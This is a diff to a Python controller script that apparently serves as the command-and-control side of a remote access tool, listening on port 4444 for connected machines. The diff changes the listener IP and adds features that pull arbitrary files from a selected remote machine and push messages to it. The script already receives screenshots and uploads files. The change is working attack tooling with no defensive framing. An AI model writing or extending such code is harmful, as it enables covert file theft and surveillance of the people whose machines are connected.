@@ -12,7 +12,7 @@ connections = []
 selected_connection = None
 selected_connection_id = -1
 
-host = "192.168.15.108"
+host = "192.168.0.13"
 port = 4444
 buffer_bytes = 1024
 
@@ -128,6 +128,43 @@ def upload_file():
     file.close()    
     send_data('done'.encode())
 
+def download_file():
+    global selected_connection
+
+    file_directory = input('Type the file directory >> ')
+    file_name = file_directory.split('/')[-1]
+
+    send_data(f'download-file {file_directory}'.encode())
+    
+    if receive_data(4096) == 'NotFound'.encode():
+        print('File not found!')
+        return
+    
+    file = open(file_name, 'wb')
+
+    print("[*] Downloading file...")
+
+    while True:
+        response = receive_data(4096)
+        try:
+            if decode_utf8(response) == 'done':
+                break
+            file.write(response)
+        except:
+            file.write(response)
+        
+
+    print("\n[+] File downloaded")
+
+    file.close()
+
+def send_message():
+    message = input('Write the message >> ')
+    send_data('message'.encode())
+    time.sleep(0.2)
+    send_data(message.encode())
+    time.sleep(0.2)
+    send_data('done'.encode())
 
 def receive_screenshot():
     global selected_connection
@@ -142,6 +179,7 @@ def receive_screenshot():
         try:
             if decode_utf8(response) == 'done':
                 break
+            picture.write(response)
         except:
             picture.write(response)
             
@@ -170,6 +208,10 @@ def interact():
             receive_screenshot()
         elif choice == '-u':
             upload_file()
+        elif choice == '-d':
+            download_file()
+        elif choice == '-m':
+            send_message()
         elif choice == '-k':
             close_connection_by_id()
             return
